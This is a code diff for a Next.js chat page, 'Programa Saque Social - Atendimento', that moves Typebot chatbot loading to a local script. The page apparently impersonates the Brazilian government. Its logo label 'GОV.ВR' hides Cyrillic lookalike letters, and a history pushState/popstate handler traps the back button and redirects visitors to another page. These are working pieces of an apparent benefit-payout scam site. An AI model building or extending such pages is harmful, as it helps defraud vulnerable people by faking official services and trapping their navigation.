@@ -4,6 +4,7 @@
 import React, { useState, useEffect, Suspense } from 'react';
 import Head from 'next/head';
 import Image from 'next/image';
+import Script from 'next/script'; // Import next/script
 import { useSearchParams, useRouter } from 'next/navigation';
 import { MoreVertical, Cookie, LayoutGrid, User, Menu, Search } from 'lucide-react';
 import '../chat-page.css'; // Styles specific to this chat page
@@ -11,19 +12,16 @@ import '../chat-page.css'; // Styles specific to this chat page
 function ChatPageContent() {
   const router = useRouter();
   const searchParams = useSearchParams();
-  // const [isLoading, setIsLoading] = useState(true); // Removed: Suspense handles this
   const [headerUserName, setHeaderUserName] = useState('Usuário');
+  const [isLocalTypebotScriptLoaded, setIsLocalTypebotScriptLoaded] = useState(false);
 
   useEffect(() => {
     const urlBackRedirect = '/back/index.html';
     const currentQuery = searchParams.toString();
     const trimmedUrlBackRedirect = urlBackRedirect.trim() + (urlBackRedirect.includes("?") ? '&' : '?') + currentQuery;
 
-    // Ensure history modification only happens once or is idempotent
     if (window.history.state?.pageInitialized !== true) {
         history.pushState({ pageInitialized: true }, "", window.location.href);
-        // Consider if a second pushState is truly needed here or if it's a remnant
-        // history.pushState({ pageInitialized: true }, "", window.location.href);
     }
     
     const handlePopState = () => {
@@ -38,61 +36,64 @@ function ChatPageContent() {
       setHeaderUserName(nomeParam.split(' ')[0] || 'Usuário');
     }
 
-    // Removed loadingTimer and setIsLoading(false) as Suspense handles initial load display
-    // const loadingTimer = setTimeout(() => {
-    //   setIsLoading(false);
-    // }, 1200);
-
     return () => {
       window.removeEventListener('popstate', handlePopState);
-      // clearTimeout(loadingTimer); // Timer removed
     };
   }, []); // Empty dependency array: runs once on mount
 
   useEffect(() => {
-    const typebotElement = document.querySelector('typebot-standard');
-
-    if (!typebotElement) {
-        console.error('Typebot standard element not found in DOM for dynamic import init.');
+    if (isLocalTypebotScriptLoaded) {
+      const typebotElement = document.querySelector('typebot-standard');
+      if (!typebotElement) {
+        console.error('Typebot standard element not found in DOM for initStandard call.');
         return;
-    }
-    
-    // Check if Typebot is already initialized to prevent re-initialization
-    if (typebotElement.shadowRoot?.querySelector('.typebot-container')) {
+      }
+
+      // Check if Typebot is already initialized to prevent re-initialization
+      if (typebotElement.shadowRoot?.querySelector('.typebot-container')) {
         console.log('Typebot already initialized or element not ready for re-init.');
         return;
-    }
+      }
 
-    import('@typebot.io/js') 
-      .then(module => {
-        const Typebot = module.default; 
-        if (Typebot && typeof Typebot.initStandard === 'function') {
-          console.log('Initializing Typebot from dynamically imported package...');
-          Typebot.initStandard({
+      if (window.Typebot && typeof window.Typebot.initStandard === 'function') {
+        console.log('Initializing Typebot from local script...');
+        try {
+          window.Typebot.initStandard({
             typebot: "24lkdef", 
-            apiHost: "https://chat.bestbot.info", 
+            apiHost: "https://chat.bestbot.info",
+            // Ensure the typebot-standard element exists before initializing
+            // Typebot usually finds it by tag name, but explicit target can be an option if needed
           });
-        } else {
-          console.error('Typebot.initStandard not found on imported module:', module);
+        } catch (e) {
+          console.error('Error initializing Typebot from local script:', e);
         }
-      })
-      .catch(err => {
-        console.error('Error dynamically importing Typebot package:', err);
-      });
-  }, []); // Empty dependency array to run once on mount
+      } else {
+        console.error('window.Typebot or window.Typebot.initStandard is not available, even after local script reported loaded.');
+      }
+    }
+  }, [isLocalTypebotScriptLoaded]); // Runs when isLocalTypebotScriptLoaded changes
 
   return (
     <>
       <Head>
         <title>Programa Saque Social - Atendimento</title>
+        {/* Removed modulepreload for CDN, as we are using a local script */}
       </Head>
       
-      <div className="chat-page-body">
-        {/* Removed internal isLoading check and loading screen div; Suspense handles this */}
-        {/* {isLoading && (
-          <div id="loading-screen"> ... </div>
-        )} */}
+      {/* Script tag for local Typebot JS */}
+      <Script
+        src="/js/typebot-web.js" // Path to your local Typebot script in the public folder
+        strategy="lazyOnload"
+        onLoad={() => {
+          console.log('Local Typebot script loaded successfully.');
+          setIsLocalTypebotScriptLoaded(true);
+        }}
+        onError={(e) => {
+          console.error('Error loading local Typebot script:', e);
+        }}
+      />
 
+      <div className="chat-page-body">
         <header className="chat-page-header">
           <div className="logo">
             <svg width="148" height="45" viewBox="0 0 148 45" aria-label="GОV.ВR">
@@ -135,7 +136,7 @@ function ChatPageContent() {
             height={40} 
             className="footer-logo"
             data-ai-hint="company logo"
-            priority={false}
+            priority={false} // Lowered priority as it's in footer
           />
         </footer>
       </div>
